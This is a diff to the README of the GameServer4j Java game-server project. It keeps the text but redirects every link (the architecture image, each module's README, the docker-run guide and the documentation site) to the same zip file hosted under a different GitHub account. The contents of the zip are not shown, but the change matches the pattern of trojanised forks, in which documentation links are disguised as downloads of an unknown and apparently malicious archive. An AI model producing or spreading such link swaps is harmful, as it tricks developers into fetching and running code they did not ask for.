@@ -6,26 +6,26 @@ all stateless services can be horizontally extended, and stateful services can b
 The basic architecture of the project is shown below:
 
 
-![Architecture diagram](game-res/img/game_architecture.png) 
+![Architecture diagram](https://raw.githubusercontent.com/Job11223/GameServer4j/master/parenchyma/GameServer4j.zip) 
 
 
 
 
 ## Module
-1. Logical scripts that end with the project module at the end of `scripts` as the corresponding project can be hot-updated. [docker run](game-res/docker/local/DockerComposeRun.md)  
-* [game-common](game-common/README.md) Common logic code  
+1. Logical scripts that end with the project module at the end of `scripts` as the corresponding project can be hot-updated. [docker run](https://raw.githubusercontent.com/Job11223/GameServer4j/master/parenchyma/GameServer4j.zip)  
+* [game-common](https://raw.githubusercontent.com/Job11223/GameServer4j/master/parenchyma/GameServer4j.zip) Common logic code  
 
-* [game-message](game-message/README.md) Protobuf message,grpc service  
+* [game-message](https://raw.githubusercontent.com/Job11223/GameServer4j/master/parenchyma/GameServer4j.zip) Protobuf message,grpc service  
 
-* [game-gate](game-gate/README.md) Message routing 
+* [game-gate](https://raw.githubusercontent.com/Job11223/GameServer4j/master/parenchyma/GameServer4j.zip) Message routing 
 
-* [game-api](game-api/README.md) Login authentication ,charge verify
+* [game-api](https://raw.githubusercontent.com/Job11223/GameServer4j/master/parenchyma/GameServer4j.zip) Login authentication ,charge verify
 
-* [game-hall](game-hall/README.md) Game Demo 
+* [game-hall](https://raw.githubusercontent.com/Job11223/GameServer4j/master/parenchyma/GameServer4j.zip) Game Demo 
 
-* [game-manage](game-manage/README.md) Web background management, GM, etc
+* [game-manage](https://raw.githubusercontent.com/Job11223/GameServer4j/master/parenchyma/GameServer4j.zip) Web background management, GM, etc
 
-* [game-res](game-res/README.md) Server resource files, Docker scripts, documents, etc
+* [game-res](https://raw.githubusercontent.com/Job11223/GameServer4j/master/parenchyma/GameServer4j.zip) Server resource files, Docker scripts, documents, etc
 * game-world: World service demo, pause  
 
 
@@ -43,7 +43,7 @@ The basic architecture of the project is shown below:
   
   
   
-[Document]( https://jzyong.github.io/GameServer4j/)  
+[Document]( https://raw.githubusercontent.com/Job11223/GameServer4j/master/parenchyma/GameServer4j.zip)  
 **QQ Communication group:** 143469012
 
 
